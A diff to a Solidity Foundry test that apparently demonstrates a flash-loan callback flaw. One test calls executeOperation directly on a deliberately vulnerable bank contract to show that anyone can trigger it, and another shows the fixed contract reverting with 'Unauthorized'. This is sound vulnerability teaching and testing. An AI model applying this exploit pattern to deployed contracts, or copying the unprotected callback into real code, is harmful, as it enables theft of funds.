@@ -39,25 +39,55 @@ contract ContractTest is Test {
             address(LendingPoolContract),
             address(USDaContract)
         );
-        USDaContract.transfer(address(LendingPoolContract), 10000 ether);
+        USDaContract.transfer(address(LendingPoolContract), 100 ether);
+
         FixedSimpleBankContract = new FixedSimpleBank(
             address(LendingPoolContract),
             address(USDaContract)
         );
+        USDaContract.transfer(address(SimpleBankBugContract), 100 ether);
+
+        USDaContract.transfer(address(FixedSimpleBankContract), 100 ether);
     }
 
     function testFlashLoanFlaw() public {
-        LendingPoolContract.flashLoan(
-            500 ether,
-            address(SimpleBankBugContract),
+        console.log(
+            "Bank and Lending pool Balance Before: ",
+            USDaContract.balanceOf(address(SimpleBankBugContract)) / 1 ether,
+            USDaContract.balanceOf(address(LendingPoolContract)) / 1 ether
+        );
+        // LendingPoolContract.flashLoan(
+        //     100,
+        //     address(SimpleBankBugContract),
+        //     "0x0"
+        // );
+
+        IFlashLoanReceiver(address(SimpleBankBugContract)).executeOperation(
+            100 ether,
+            address(this),
+            address(this),
             "0x0"
+        );
+
+        console.log(
+            "Bank and Lending pool Balance After: ",
+            USDaContract.balanceOf(address(SimpleBankBugContract)) / 1 ether,
+            USDaContract.balanceOf(address(LendingPoolContract)) / 1 ether
         );
     }
 
     function testFlashLoanSecure() public {
         vm.expectRevert("Unauthorized");
+        IFlashLoanReceiver(address(FixedSimpleBankContract)).executeOperation(
+            100 ether,
+            address(this),
+            address(this),
+            "0x0"
+        );
+        vm.expectRevert("Unauthorized");
+
         LendingPoolContract.flashLoan(
-            500 ether,
+            100 ether,
             address(FixedSimpleBankContract),
             "0x0"
         );
